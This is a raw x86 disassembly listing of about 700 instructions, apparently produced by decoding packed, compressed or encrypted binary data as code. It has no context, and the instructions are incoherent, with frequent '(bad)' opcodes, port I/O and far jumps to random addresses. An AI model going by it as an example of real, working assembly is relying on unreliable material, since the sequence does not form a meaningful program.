  412c1a:	in     al,dx
  412c1b:	pop    ebp
  412c1c:	cmp    DWORD PTR [edi-0x30],esi
  412c1f:	nop
  412c20:	(bad)
  412c24:	shl    ah,cl
  412c26:	jo     0x412bbb
  412c28:	inc    ebx
  412c29:	and    DWORD PTR [edx+0x2a97367a],edi
  412c2f:	scas   eax,DWORD PTR es:[edi]
  412c30:	in     al,0xea
  412c32:	sbb    BYTE PTR [edx-0x74b17c7],cl
  412c38:	mov    edi,0x551ba4ab
  412c3d:	sub    edi,DWORD PTR [edi+edi*2+0x4e]
  412c41:	loopne 0x412c62
  412c43:	lock pop ebp
  412c45:	mov    ah,bh
  412c47:	popf   
  412c48:	ds addr16 cmc 
  412c4b:	les    ebx,FWORD PTR [esi]
  412c4d:	jecxz  0x412beb
  412c4f:	xbegin 0x679b9d09
  412c55:	sbb    edi,DWORD PTR [esi]
  412c57:	fadd   st(2),st
  412c59:	ins    BYTE PTR es:[edi],dx
  412c5a:	jl     0x412c91
  412c5c:	and    BYTE PTR [edi-0x22],ah
  412c5f:	pop    ds
  412c60:	mov    eax,ds:0x8ff26d58
  412c65:	ins    BYTE PTR es:[edi],dx
  412c66:	and    ch,bh
  412c68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c69:	fsub   st,st(6)
  412c6b:	push   edi
  412c6c:	into   
  412c6d:	sahf   
  412c6e:	loopne 0x412cdc
  412c70:	mov    WORD PTR [eax+0x2ee53af8],gs
  412c76:	test   eax,0x9b87ee8f
  412c7b:	iret   
  412c7c:	sbb    DWORD PTR [edi+edi*4-0x72],edi
  412c80:	repz sbb BYTE PTR [esi-0x38931f93],ch
  412c87:	jle    0x412c2d
  412c89:	sbb    dl,cl
  412c8b:	xchg   esi,eax
  412c8c:	dec    eax
  412c8d:	jno    0x412cb3
  412c8f:	push   esi
  412c90:	test   DWORD PTR [edi+0x5eb5df28],edx
  412c96:	jg     0x412cd6
  412c98:	jns    0x412c61
  412c9a:	loope  0x412d09
  412c9c:	stos   DWORD PTR es:[edi],eax
  412c9d:	mov    ebp,0x99115dcb
  412ca2:	mov    dl,0x69
  412ca4:	jecxz  0x412cc8
  412ca6:	mov    ch,0xbf
  412ca8:	or     eax,0x7481c01e
  412cad:	mov    WORD PTR [ebp+0x7],fs
  412cb0:	xchg   BYTE PTR [edi+0xa],cl
  412cb3:	shl    esp,1
  412cb5:	fs lock and edi,DWORD PTR cs:[eax]
  412cba:	inc    edx
  412cbc:	sbb    al,0x74
  412cbe:	xchg   edi,eax
  412cbf:	cmp    cl,0x1c
  412cc2:	pop    ecx
  412cc3:	xor    eax,0xc6e1994e
  412cc8:	dec    ecx
  412cc9:	leave  
  412cca:	push   eax
  412ccb:	addr16 iret 
  412ccd:	ins    BYTE PTR es:[edi],dx
  412cce:	mov    eax,ds:0xfb3421ad
  412cd3:	push   ebx
  412cd4:	push   edx
  412cd5:	and    esp,DWORD PTR [esi]
  412cd7:	test   eax,0x8c0e6019
  412cdc:	and    cl,BYTE PTR [ebp+0x7f]
  412cdf:	pop    edi
  412ce0:	sub    BYTE PTR [edi],0xbf
  412ce3:	xor    BYTE PTR [edi],cl
  412ce5:	in     al,0x51
  412ce7:	nop
  412ce8:	push   ecx
  412ce9:	pusha  
  412cea:	xor    ax,0x3789
  412cee:	call   0x653:0x50b65a5f
  412cf5:	dec    esi
  412cf6:	pop    edi
  412cf7:	mov    WORD PTR [ecx],cs
  412cf9:	test   DWORD PTR [esi],esi
  412cfb:	xlat   BYTE PTR ds:[ebx]
  412cfc:	imul   DWORD PTR [ecx-0x49b82c41]
  412d02:	mov    edi,0xee118dbe
  412d07:	loopne 0x412d3e
  412d09:	out    dx,eax
  412d0a:	stos   BYTE PTR es:[edi],al
  412d0b:	adc    DWORD PTR [ebx-0x2a],edi
  412d0e:	xor    dl,cl
  412d10:	in     al,dx
  412d11:	mov    dh,0x23
  412d13:	shl    BYTE PTR [esi+0x581add16],cl
  412d19:	lods   eax,DWORD PTR ds:[esi]
  412d1a:	jp     0x412d5a
  412d1c:	jmp    FWORD PTR ds:0x438048cf
  412d22:	mov    ds:0x4680407e,al
  412d27:	mov    ch,0x9a
  412d29:	cmp    ah,0x64
  412d2c:	adc    BYTE PTR [esi],ch
  412d2e:	call   0xe6baaa94
  412d33:	xchg   ebp,eax
  412d34:	fisub  DWORD PTR [eax-0x56]
  412d37:	push   ebx
  412d38:	es mov edx,0xa6a352ad
  412d3e:	push   ebx
  412d3f:	mov    dl,al
  412d41:	xchg   dh,cl
  412d43:	int3   
  412d44:	test   BYTE PTR [ebp-0x4d4a684a],bh
  412d4a:	or     edx,esp
  412d4c:	xor    esi,esi
  412d4e:	sbb    ecx,DWORD PTR [edi-0x39]
  412d51:	cs call 0xd5268585
  412d57:	push   edi
  412d58:	push   es
  412d59:	ins    BYTE PTR es:[edi],dx
  412d5a:	lock ror BYTE PTR [ecx-0x5fca328],cl
  412d61:	outs   dx,BYTE PTR ds:[esi]
  412d62:	pusha  
  412d63:	pop    edi
  412d64:	lahf   
  412d65:	push   edx
  412d66:	jns    0x412d98
  412d68:	(bad)  
  412d69:	sbb    al,0xad
  412d6b:	lock cmp ebp,ebx
  412d6e:	(bad)  
  412d6f:	ret    
  412d70:	pop    ebp
  412d71:	jo     0x412d24
  412d73:	call   FWORD PTR [edx+eiz*4]
  412d76:	push   edi
  412d77:	ret    
  412d78:	push   ecx
  412d79:	inc    esi
  412d7a:	dec    edi
  412d7b:	(bad)  
  412d7c:	loope  0x412da6
  412d7e:	mov    ebp,0xe341b8ec
  412d83:	xchg   edx,eax
  412d84:	bound  edx,QWORD PTR [edx]
  412d86:	pop    edx
  412d87:	adc    bl,BYTE PTR [ecx+0x24]
  412d8a:	loope  0x412db8
  412d8c:	dec    edx
  412d8d:	mov    bh,0x11
  412d8f:	xchg   edi,eax
  412d90:	or     ebx,DWORD PTR [esp+ecx*2]
  412d93:	or     eax,0xdf48b7a0
  412d98:	aaa    
  412d99:	adc    ecx,0xdef856e0
  412d9f:	into   
  412da0:	sub    BYTE PTR [edi+0x76],ch
  412da3:	inc    edx
  412da4:	inc    ebp
  412da5:	dec    esi
  412da6:	cwde   
  412da7:	fmulp  st(4),st
  412da9:	sub    DWORD PTR [eax+0x87ce8a0],esi
  412daf:	dec    esp
  412db0:	aaa    
  412db1:	xor    ecx,esi
  412db3:	scas   eax,DWORD PTR es:[edi]
  412db4:	mov    WORD PTR [ecx+0x33],ds
  412db7:	mov    bh,0xa
  412db9:	int3   
  412dba:	in     al,dx
  412dbb:	inc    edi
  412dbc:	xchg   esi,eax
  412dbd:	or     BYTE PTR ds:0xc8a309b1,ch
  412dc3:	fisttp DWORD PTR [esi+0x2d]
  412dc6:	adc    al,0x6a
  412dc8:	loope  0x412d6e
  412dca:	int3   
  412dcb:	jmp    0x100c8aa3
  412dd0:	ins    BYTE PTR es:[edi],dx
  412dd1:	lods   eax,DWORD PTR ds:[esi]
  412dd2:	xchg   DWORD PTR [ebp-0x44abce6f],esi
  412dd8:	mov    ds:0x58c6f58b,al
  412ddd:	and    esi,DWORD PTR [edi+0x77]
  412de0:	repnz push ecx
  412de2:	inc    ebx
  412de3:	lahf   
  412de4:	test   DWORD PTR [ecx+0x730fcb86],ebx
  412dea:	mov    dl,bh
  412dec:	dec    edi
  412ded:	xor    esp,esp
  412def:	dec    esp
  412df0:	jge    0x412df2
  412df2:	iret   
  412df3:	sub    ecx,ebx
  412df5:	push   cs
  412df6:	jo     0x412e2b
  412df8:	imul   ecx,DWORD PTR [ecx],0xd47ebc6b
  412dfe:	and    ebx,DWORD PTR [esi-0x76]
  412e01:	mov    bl,0xb
  412e03:	out    dx,al
  412e04:	and    DWORD PTR [edi-0x6267c625],eax
  412e0a:	xor    cl,BYTE PTR [ebx-0x8]
  412e0d:	loope  0x412dab
  412e0f:	mul    BYTE PTR ss:0x37cf1749
  412e16:	inc    edx
  412e17:	mov    eax,ds:0xa4d72f24
  412e1c:	xchg   edx,eax
  412e1d:	pop    edx
  412e1e:	xor    esp,eax
  412e20:	jp     0x412e5f
  412e22:	and    BYTE PTR [eax],ch
  412e24:	jmp    0x6d8a:0x3a4969de
  412e2b:	xor    DWORD PTR [ebx+eax*1],esi
  412e2e:	arpl   WORD PTR [esi+esi*4],ax
  412e31:	inc    DWORD PTR [ebx+0x2b]
  412e34:	repnz adc eax,0xc1848a57
  412e3a:	mov    esi,0xcac680cb
  412e3f:	cmp    al,bl
  412e41:	xchg   ecx,eax
  412e42:	fwait
  412e43:	ja     0x412e1d
  412e45:	(bad)  
  412e46:	js     0x412e9b
  412e48:	std    
  412e49:	mov    ds:0x7849e62a,eax
  412e4e:	enter  0xd248,0xee
  412e52:	push   0x71
  412e54:	sbb    ebx,DWORD PTR [ebp+0x30]
  412e57:	sbb    dl,BYTE PTR [ecx-0x50cd84b2]
  412e5d:	push   es
  412e5e:	fs loop 0x412ee0
  412e61:	inc    ebp
  412e62:	pop    ds
  412e63:	imul   esi,DWORD PTR [ebx-0x3],0xb2ed7887
  412e6a:	nop
  412e6b:	inc    edi
  412e6c:	inc    esp
  412e6d:	jg     0x412e6c
  412e6f:	sbb    BYTE PTR [esi-0x73],bh
  412e72:	jge    0x412e35
  412e74:	inc    ebx
  412e75:	and    al,0x18
  412e77:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e79:	popa   
  412e7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e7b:	inc    eax
  412e7c:	cmp    al,BYTE PTR [ebx+ecx*2-0x76876c05]
  412e83:	clc    
  412e84:	(bad)  
  412e85:	rol    DWORD PTR [edx],cl
  412e87:	dec    ecx
  412e88:	push   esi
  412e89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e8a:	addr16 jle 0x412ed0
  412e8d:	add    al,0xe3
  412e8f:	jne    0x412e42
  412e91:	xor    eax,0x63f2f6ee
  412e96:	push   cs
  412e97:	adc    al,0x8a
  412e99:	dec    edx
  412e9a:	sbb    ebp,edx
  412e9c:	jge    0x412ef2
  412e9e:	test   DWORD PTR ss:[esi+0x5568913e],ebx
  412ea5:	repz inc edx
  412ea7:	mov    dl,ch
  412ea9:	mov    ebp,0xcd1f9fe1
  412eae:	push   ebx
  412eaf:	adc    eax,0xf114bc09
  412eb4:	jp     0x412e88
  412eb6:	xchg   edi,eax
  412eb7:	mov    al,0x3
  412eb9:	push   0xfffffff4
  412ebb:	push   ebp
  412ebc:	jae    0x412ede
  412ebe:	arpl   WORD PTR [ebx-0xcbff5],sp
  412ec4:	dec    ecx
  412ec5:	pop    ebx
  412ec6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ec7:	mov    cs,ecx
  412ec9:	push   cs
  412eca:	and    eax,0x1dec7930
  412ecf:	ret    0x8d61
  412ed2:	std    
  412ed3:	pop    ds
  412ed4:	inc    eax
  412ed5:	jp     0x412ed6
  412ed7:	cmp    al,0x1e
  412ed9:	pop    edi
  412eda:	mov    eax,ds:0xd8ea5122
  412edf:	arpl   WORD PTR [edx+ecx*2+0x79e99cab],sp
  412ee6:	std    
  412ee7:	sbb    BYTE PTR [ebp+0x66],dh
  412eea:	sbb    DWORD PTR [esi-0x4340b56d],edi
  412ef0:	push   esi
  412ef1:	add    eax,0xe8cc92b7
  412ef6:	xchg   DWORD PTR [esi+0x66e49f86],esi
  412efc:	xor    dl,BYTE PTR [ebp+0x4c63eaa8]
  412f02:	int3   
  412f03:	pop    es
  412f04:	leave  
  412f05:	(bad)  
  412f06:	jae    0x412f4f
  412f08:	adc    BYTE PTR [ebp+0x6b79dd19],dh
  412f0e:	cwde   
  412f0f:	aaa    
  412f10:	add    esi,DWORD PTR [esi+ebp*8]
  412f13:	sub    bh,0x55
  412f16:	push   ds
  412f17:	mov    eax,eax
  412f19:	in     al,0xc4
  412f1b:	inc    esi
  412f1c:	mov    eax,?
  412f1e:	inc    eax
  412f1f:	div    DWORD PTR [edi+0x2b]
  412f22:	mov    ebp,0x2fd5b2fa
  412f27:	fdiv   QWORD PTR [ebx]
  412f29:	mov    al,0xa6
  412f2b:	shl    DWORD PTR ds:0x493b7fe0,1
  412f31:	std    
  412f32:	pop    es
  412f33:	fisubr DWORD PTR [edi]
  412f35:	sbb    eax,0x79ecae31
  412f3a:	push   edx
  412f3b:	shl    DWORD PTR ds:0xfee712bc,0x2d
  412f42:	(bad)  
  412f43:	loopne 0x412f9b
  412f45:	sub    DWORD PTR [eax],edx
  412f47:	mov    cl,0x1c
  412f49:	sub    bl,bl
  412f4b:	xchg   ebp,eax
  412f4c:	cmc    
  412f4d:	leave  
  412f4e:	mov    esp,0x15d5a7e3
  412f53:	cmp    eax,0xa41fa497
  412f58:	push   esp
  412f59:	cdq    
  412f5a:	data16 int3 
  412f5c:	xchg   edx,eax
  412f5d:	sbb    cl,BYTE PTR [edx]
  412f5f:	retf   0xd16a
  412f62:	test   al,0x95
  412f64:	fmul   DWORD PTR [ebx]
  412f66:	int3   
  412f67:	mov    ebx,0x9c30cf80
  412f6c:	push   edx
  412f6d:	out    0x86,eax
  412f6f:	cli    
  412f70:	rol    BYTE PTR [ebx-0x2f],0x8b
  412f74:	and    eax,0x1d451cd9
  412f79:	sub    eax,0x6d812ccf
  412f7e:	fdiv   st(4),st
  412f80:	push   ebx
  412f81:	pop    ebx
  412f82:	in     eax,0xca
  412f84:	div    DWORD PTR [ebp-0x51]
  412f87:	and    eax,0x9a4b8d52
  412f8c:	xor    al,0x6
  412f8e:	out    0xb1,al
  412f90:	fldenv [ecx-0x74]
  412f93:	push   ebx
  412f94:	mov    al,0x4d
  412f96:	lock fcmove st,st(3)
  412f99:	stc    
  412f9a:	cmovs  esi,DWORD PTR [edi]
  412f9d:	rcr    BYTE PTR [esp+eax*8+0x6],cl
  412fa1:	push   ds
  412fa2:	shr    DWORD PTR [esi-0x1ea41b1b],cl
  412fa8:	and    DWORD PTR [ebx-0x26],edi
  412fab:	pop    ss
  412fac:	fs add al,0xfc
  412faf:	fwait
  412fb0:	inc    eax
  412fb1:	dec    ecx
  412fb2:	lea    ebx,[ebx]
  412fb4:	mov    esi,0x149f88e9
  412fb9:	inc    edx
  412fba:	jb     0x413022
  412fbc:	xchg   BYTE PTR [esi],bh
  412fbe:	popf   
  412fbf:	jmp    0xde5b70a9
  412fc4:	cs xor edx,ebp
  412fc7:	xchg   edx,eax
  412fc8:	(bad)  
  412fc9:	sbb    ebp,DWORD PTR [ebp-0x7fe5b21b]
  412fcf:	in     al,0xaa
  412fd1:	leave  
  412fd2:	das    
  412fd3:	jg     0x412f67
  412fd5:	test   al,0xbb
  412fd7:	iret   
  412fd8:	xlat   BYTE PTR ds:[ebx]
  412fd9:	mov    ds,WORD PTR [esi]
  412fdb:	jl     0x412ff6
  412fdd:	fs push ecx
  412fdf:	mov    DWORD PTR [eax],ebp
  412fe1:	sbb    DWORD PTR ds:0x43eb4da3,edx
  412fe7:	mov    esi,ecx
  412fe9:	xchg   edx,eax
  412fea:	pop    ecx
  412feb:	adc    DWORD PTR [ebp-0x585938e0],edi
  412ff1:	ss test al,0xd0
  412ff4:	popf   
  412ff5:	pushf  
  412ff6:	out    dx,eax
  412ff7:	test   al,0x4b
  412ff9:	shl    BYTE PTR [eax-0x3573b973],cl
  412fff:	dec    esi
  413000:	sahf   
  413001:	sub    ebp,esi
  413003:	inc    edi
  413004:	dec    eax
  413005:	sbb    dh,al
  413007:	aaa    
  413008:	and    cl,dl
  41300a:	sbb    al,0x71
  41300c:	repz aam 0xe6
  41300f:	xchg   dl,bl
  413011:	xor    al,0xa7
  413013:	mov    WORD PTR [ebp-0x70],gs
  413016:	pushf  
  413017:	(bad)  
  413018:	or     BYTE PTR [edi+0x15d74ae4],cl
  41301e:	mov    ah,0xe7
  413020:	sub    ah,BYTE PTR [edi-0x2dfc747f]
  413026:	int    0xa3
  413028:	inc    DWORD PTR [edi-0x77]
  41302b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41302c:	addr16 pushf 
  41302e:	lods   eax,DWORD PTR ds:[esi]
  41302f:	add    ebp,DWORD PTR [edi]
  413031:	fs cmp al,0x30
  413034:	dec    edi
  413035:	lds    ebp,FWORD PTR [ebp-0x3b]
  413038:	aam    0x2a
  41303a:	mov    fs,WORD PTR [eax+0x38bab80a]
  413040:	cmp    eax,0x854fba72
  413045:	into   
  413046:	cmp    eax,DWORD PTR ds:0xd19b6562
  41304c:	dec    ebx
  41304d:	je     0x413056
  41304f:	xchg   edx,eax
  413050:	loopne 0x4130cc
  413052:	pushf  
  413053:	push   edi
  413054:	out    dx,al
  413055:	popa   
  413056:	adc    eax,0xd77e32a6
  41305b:	jbe    0x413067
  41305d:	cmp    esp,DWORD PTR [edx+0x5a5e8011]
  413063:	loopne 0x4130a8
  413065:	push   0xf4eefbd3
  41306a:	or     DWORD PTR [edx-0x40],ecx
  41306d:	mov    BYTE PTR [ecx+0x275c4437],bl
  413073:	out    0xbd,al
  413075:	fs ss pop edx
  413078:	lock scas al,BYTE PTR es:[edi]
  41307a:	mov    ecx,0x2ece66e3
  41307f:	sar    bh,1
  413081:	sar    BYTE PTR ds:0x7c810a40,1
  413087:	sub    al,0x9
  413089:	sbb    cl,BYTE PTR [ebx+0x260bc77f]
  41308f:	hlt    
  413090:	sbb    BYTE PTR [edi-0x79],0xa0
  413094:	test   al,0xcd
  413096:	stos   DWORD PTR es:[edi],eax
  413097:	adc    edx,DWORD PTR [eax]
  413099:	les    esp,FWORD PTR [eax]
  41309b:	mov    al,ds:0x26446aea
  4130a0:	bnd je 0x4130c2
  4130a3:	mov    esi,0x768dfd04
  4130a8:	xchg   esi,eax
  4130a9:	jno    0x4130d2
  4130ab:	xchg   esi,eax
  4130ac:	jg     0x413045
  4130ae:	jle    0x4130fe
  4130b0:	popf   
  4130b1:	iret   
  4130b2:	popf   
  4130b3:	fidiv  DWORD PTR [eax]
  4130b5:	dec    eax
  4130b6:	pop    esp
  4130b7:	adc    al,0xee
  4130b9:	gs test eax,0x711a31ee
  4130bf:	jge    0x413091
  4130c1:	jl     0x413045
  4130c3:	jp     0x4130da
  4130c5:	mov    ds:0x846e096e,al
  4130ca:	retf   
  4130cb:	(bad)  
  4130cc:	xor    dl,BYTE PTR [edx]
  4130ce:	jmp    0xa396de08
  4130d3:	push   edx
  4130d4:	nop
  4130d5:	inc    ebp
  4130d6:	pushf  
  4130d7:	xchg   esp,eax
  4130d8:	add    eax,0x4b810622
  4130dd:	jne    0x41313a
  4130df:	leave  
  4130e0:	js     0x4130e5
  4130e2:	test   al,0x88
  4130e4:	sbb    al,0x29
  4130e6:	retf   0xe16a
  4130e9:	test   al,0x73
  4130eb:	js     0x4130dc
  4130ed:	mov    dh,0x9d
  4130ef:	jecxz  0x41316d
  4130f1:	outs   dx,BYTE PTR ds:[esi]
  4130f2:	adc    DWORD PTR [eax-0x1bf9838c],0xffffffdd
  4130f9:	(bad)  
  4130fa:	push   esi
  4130fb:	shl    ch,cl
  4130fd:	push   ebx
  4130fe:	xchg   edi,eax
  4130ff:	out    dx,eax
  413100:	pop    ecx
  413101:	int    0x3b
  413103:	in     eax,0xfd
  413105:	push   ds
  413106:	jb     0x41313a
  413108:	out    0x79,al
  41310a:	sbb    BYTE PTR [ebp+0x1d],bh
  41310d:	daa    
  41310e:	aas    
  41310f:	and    al,0xbe
  413111:	call   0x83e3:0xdd5e4143
  413118:	push   es
  413119:	xor    al,0x7b
  41311b:	lea    edx,[eax+eiz*1]
  41311e:	test   edx,0xd348be19
  413124:	xor    bh,0xa8
  413127:	int    0x8f
  413129:	jo     0x41315a
  41312b:	sbb    eax,DWORD PTR [ebp+0x12]
  41312e:	xchg   esp,eax
  41312f:	inc    edi
  413130:	and    DWORD PTR [ebp+0x7a93583f],ecx
  413136:	clc    
  413137:	outs   dx,BYTE PTR ds:[esi]
  413138:	xlat   BYTE PTR ds:[ebx]
  413139:	dec    ebx
  41313a:	lahf   
  41313b:	mov    bh,0x93
  41313d:	dec    edx
  41313e:	in     al,dx
  41313f:	aam    0x45
  413141:	jmp    0xc8c3eca6
  413146:	shl    DWORD PTR [eax],1
  413148:	loop   0x413186
  41314a:	inc    ebp
  41314b:	sbb    eax,0xf1962561
  413150:	retf   0x5c31
  413153:	push   ebp
  413154:	stos   BYTE PTR es:[edi],al
  413155:	out    dx,eax
  413156:	int    0xd9
  413158:	mov    esi,0x8a4fff92
  41315d:	clc    
  41315e:	or     BYTE PTR [eax+0x2c],cl
  413161:	and    BYTE PTR [edx],0x49
  413164:	rcl    DWORD PTR [edi-0x26b43bfe],1
  41316a:	(bad)  
  41316b:	or     ch,BYTE PTR [esi+0x20f4e58]
  413171:	push   ebx
  413172:	cld    
  413173:	sbb    al,0xe5
  413175:	push   cs
  413176:	mov    ch,0x9a
  413178:	cli    
  413179:	pop    edx
  41317a:	xchg   esi,eax
  41317b:	(bad)  
  41317c:	out    0x2e,eax
  41317e:	or     al,BYTE PTR [eax]
  413180:	xor    BYTE PTR [eax],bl
  413182:	jle    0x4131c8
  413184:	mov    ecx,0x59ba7d01
  413189:	xor    edi,esp
  41318b:	adc    eax,0x5315667c
  413190:	pop    edx
  413191:	add    al,0x17
  413193:	in     al,dx
  413194:	pop    edx
  413195:	retf   0xba69
  413198:	cdq    
  413199:	add    ebx,esi
  41319b:	popf   
  41319c:	xchg   esp,eax
  41319d:	xor    esp,0x24
  4131a0:	mov    ebx,0xc62fac5
  4131a5:	push   cs
  4131a6:	or     edi,ecx
  4131a8:	and    esi,0xffffffa5
  4131ab:	aam    0xd8
  4131ad:	bound  edx,QWORD PTR ds:0xa4eb071b
  4131b3:	imul   ebp,DWORD PTR [edi],0x3f
  4131b6:	test   BYTE PTR [eax],cl
  4131b8:	mov    ?,WORD PTR [ebx+eiz*4-0x714617a9]
  4131bf:	js     0x41321a
  4131c1:	pop    es
  4131c2:	out    dx,al
  4131c3:	mov    eax,ds:0x496d0c8f
  4131c8:	cld    
  4131c9:	ss adc cl,al
  4131cc:	xor    edx,edi
  4131ce:	mov    ah,0xca
  4131d0:	xchg   edi,eax
  4131d1:	mov    ah,BYTE PTR [ecx]
  4131d3:	fcom   DWORD PTR [ecx-0x745267ce]
  4131d9:	inc    esi
  4131da:	xchg   DWORD PTR [ebp-0x421eac],esi
  4131e0:	hlt    
  4131e1:	ins    BYTE PTR es:[edi],dx
  4131e2:	(bad)  
  4131e4:	jmp    0x4131e2
  4131e6:	and    eax,0xd686f8a9
  4131eb:	mov    dh,0xa9
  4131ed:	cmp    al,0xe5
  4131ef:	sub    cl,BYTE PTR [eax]
  4131f1:	sti    
  4131f2:	sub    eax,0x69c22095
  4131f7:	sahf   
  4131f8:	aas    
  4131f9:	ins    BYTE PTR es:[edi],dx
  4131fa:	mov    esi,0x2bd69958
  4131ff:	lock lahf 
  413201:	in     eax,0x1
  413203:	data16 daa 
  413205:	mov    dl,0xcb
  413207:	dec    edi
  413208:	inc    ebx
  413209:	sbb    ebx,edi
  41320b:	xchg   edi,eax
  41320c:	mov    eax,0xfc676a3e
  413211:	rcl    DWORD PTR [ebx],cl
  413213:	xchg   ebp,eax
  413214:	and    DWORD PTR [ebx-0x28],edx
  413217:	scas   al,BYTE PTR es:[edi]
  413218:	push   edx
  413219:	mov    ah,0xd2
  41321b:	js     0x413239
  41321d:	xor    eax,0x5163e4eb
  413222:	shl    BYTE PTR [ebp+0x35],cl
  413225:	sti    
  413226:	mov    ah,0x7b
  413228:	pop    ecx
  413229:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41322a:	push   0xe601e1f4
  41322f:	mov    ds:0x3ef368b4,eax
  413234:	jbe    0x41320e
  413236:	call   0xdb7eb9ad
  41323b:	cmp    BYTE PTR [edx],0xba
  41323e:	cmp    ecx,DWORD PTR [esi-0x64]
  413241:	add    DWORD PTR [edi-0x6217df8],esi
  413247:	mov    ebx,0x6a6155ae
  41324c:	mov    edx,DWORD PTR ds:0xaa42f324
  413252:	xchg   edi,eax
  413253:	cwde   
  413254:	add    DWORD PTR [ecx],ecx
  413256:	leave  
  413257:	cdq    
  413258:	mov    al,ds:0x170a8ddf
  41325d:	xor    eax,0x8ec6f458
  413262:	out    0x2d,al
  413264:	pop    edi
  413266:	sbb    BYTE PTR [ecx],ah
  413268:	int    0x92
  41326a:	les    eax,FWORD PTR [eax-0xc023790]
  413270:	inc    ebx
  413271:	push   cs
  413272:	addr16 iret 
  413274:	mov    edx,DWORD PTR [esi+esi*2]
  413277:	out    dx,al
  413278:	inc    edx
  413279:	lods   eax,DWORD PTR ds:[esi]
  41327a:	and    al,0xbe
  41327c:	mov    esi,0xaabc0d2e
  413281:	call   0x80c96753
  413286:	and    al,0x1e
  413288:	jns    0x413242
  41328a:	sbb    esi,DWORD PTR [edi]
  41328c:	in     eax,0x9e
  41328e:	cmp    eax,0x766751e1
  413293:	idiv   DWORD PTR [esi+eiz*8]
  413296:	xor    edx,ebp
  413298:	xchg   ecx,eax
  413299:	popa   
  41329a:	mov    eax,ecx
  41329c:	in     al,dx
  41329d:	sub    esi,DWORD PTR [esi+0x11ad9d5a]
  4132a3:	fbld   TBYTE PTR ds:0xf95c780e
  4132a9:	inc    eax
  4132aa:	or     eax,0xbe31245a
  4132af:	and    BYTE PTR [eax-0x39],al
  4132b2:	enter  0x5bb0,0x87
  4132b6:	xchg   ecx,ebp
  4132b8:	(bad)  
  4132b9:	ror    DWORD PTR [ebx-0x2a],1
  4132bc:	dec    eax
  4132bd:	and    al,0xdc
  4132bf:	mov    bh,dh
  4132c1:	fsub   DWORD PTR [edx+eiz*8-0x58c6cd1e]
  4132c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132c9:	loopne 0x413325
  4132cb:	mov    dl,0x8f
  4132cd:	scas   al,BYTE PTR es:[edi]
  4132ce:	loop   0x4132cf
  4132d0:	out    dx,al
  4132d1:	add    DWORD PTR [ecx+0x5fa218f1],0xffffffb6
  4132d8:	xor    eax,0xe2263365
  4132dd:	sub    dl,BYTE PTR [edx+ebx*4]
  4132e0:	in     al,0xeb
  4132e2:	je     0x41332e
  4132e4:	push   eax
  4132e5:	fwait
  4132e6:	and    eax,0xd8fafbb0
  4132eb:	mov    ebx,0x60384961
  4132f0:	hlt    
  4132f1:	mov    cl,0x51
  4132f3:	enter  0x3068,0x10
  4132f7:	loopne 0x4132f2
  4132f9:	cmp    eax,0x32a7fa5c
  4132fe:	(bad)  
  4132ff:	into   
  413300:	mov    cx,0xb7eb
  413304:	mov    BYTE PTR [ecx+edi*4],ch
  413307:	adc    eax,0x8681b96a
  41330c:	dec    edx
  41330d:	mov    bh,0x29
  41330f:	mov    bh,bl
  413311:	pusha  
  413312:	sbb    eax,0xe1c4ee20
  413317:	push   eax
  413318:	add    cl,ah
  41331a:	ret    
  41331b:	sbb    DWORD PTR [ecx-0x747e36e9],ebp
  413321:	test   eax,0x80ed0a54
  413326:	aaa    
  413327:	fld    TBYTE PTR [ecx-0x1b95070c]
  41332d:	sbb    DWORD PTR [ecx-0x5b106d5],esp
  413333:	aad    0xd8
  413335:	cmp    al,0x58
  413337:	jl     0x4132e1
  413339:	test   BYTE PTR [edx+0x6a341563],bl
  41333f:	data16 sub bh,BYTE PTR [esi-0x30]
  413343:	inc    ecx
  413344:	je     0x413379
  413346:	pop    eax
  413347:	mov    al,0xa8
  413349:	jg     0x413379
  41334b:	and    al,0x20
  41334d:	push   ecx
  41334e:	mov    BYTE PTR [esi],dl
  413350:	retf   
  413351:	call   0x1325:0x4060d1c8
  413358:	stos   BYTE PTR es:[edi],al
  413359:	pop    esp
  41335a:	mov    bl,0x67
  41335c:	out    0xee,eax
  41335e:	sub    ecx,ecx
  413360:	mov    ebp,0xe9565320
  413365:	mov    edi,0xf346f29c
  41336a:	loop   0x41331b
  41336c:	inc    edi
  41336d:	adc    DWORD PTR [esi+0x12],0xffffffd0
  413371:	ret    0x3912
  413374:	lock dec DWORD PTR [ebx+eiz*2]
  413378:	jo     0x4133f8
  41337a:	ds xchg esi,eax
  41337c:	pop    eax
  41337d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41337e:	mov    dh,0x6d
  413380:	mov    edx,0x95c41546
  413385:	and    ebp,DWORD PTR [edi]
  413387:	and    ah,ah
  413389:	sar    cl,0x59
  41338c:	test   DWORD PTR [ecx-0x755ec0ac],0xe4e05b9f
  413396:	xchg   esp,eax
  413397:	repnz inc edi
  413399:	bound  ecx,QWORD PTR [edi]
  41339b:	nop
  41339c:	sbb    esp,DWORD PTR [edx+0x3d]
  41339f:	xor    esp,esp
  4133a1:	xchg   ebp,eax
  4133a2:	dec    edx
  4133a3:	mov    al,0xd5
  4133a5:	dec    edi
  4133a6:	stos   DWORD PTR es:[edi],eax
  4133a7:	xor    BYTE PTR [ebp+0x26],al
  4133aa:	test   al,0x6c
  4133ac:	adc    ch,BYTE PTR [edi-0x6a]
  4133af:	(bad)  
  4133b0:	in     eax,0x84
  4133b2:	xor    BYTE PTR [ebx],bl
  4133b4:	add    BYTE PTR [ebp+0x30e5463],bl
  4133ba:	ret    0x4a51
  4133bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133be:	adc    ch,ah
  4133c0:	cmp    esp,DWORD PTR [edi+0x38d62eea]
  4133c6:	inc    edx
  4133c7:	call   0xba88:0xe32fa37f
  4133ce:	es jbe 0x413432
  4133d1:	cmp    ebp,ebp
  4133d3:	push   ecx
  4133d4:	push   ecx
  4133d5:	jge    0x4133c3
  4133d7:	call   DWORD PTR [ecx+0x55]
  4133da:	mov    ecx,0xec41fe9b
  4133df:	or     dh,cl
  4133e1:	jl     0x413391
